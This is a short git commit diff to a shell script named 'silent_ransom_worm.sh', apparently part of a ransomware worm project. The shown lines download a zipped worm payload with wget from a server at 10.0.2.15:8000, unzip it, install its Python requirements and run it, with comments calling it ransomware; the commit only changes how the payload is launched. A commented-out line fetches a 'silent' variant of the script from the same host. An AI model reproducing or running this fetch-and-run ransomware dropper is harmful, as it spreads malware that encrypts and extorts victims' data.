99b6e870867eac20d10cf37388e32a9778814758
Dinones <leixpinyon6@gmail.com>
2023-12-16 12:34:43 +0100

    updated bash

--- server/silent_ransom_worm.sh
+++ server/silent_ransom_worm.sh
@@ -14,7 +14,7 @@ else
     /usr/bin/wget -O ransom_worm.zip '10.0.2.15:8000/send_ransomworm'; # Downloads the worm
     /usr/bin/unzip ransom_worm.zip; # Unzips the worm
     python3 -m pip install -r requirements.txt; # Installs the requirements.txt
-    python3 main.py &; # Runs the ransomware
+    python3 main.py; # Runs the ransomware
 
     # /usr/bin/wget -O silent_ransom_worm.sh '10.0.2.15:8000/send_ransomworm_silent';
     # chmod +x silent_ransom_worm.sh;
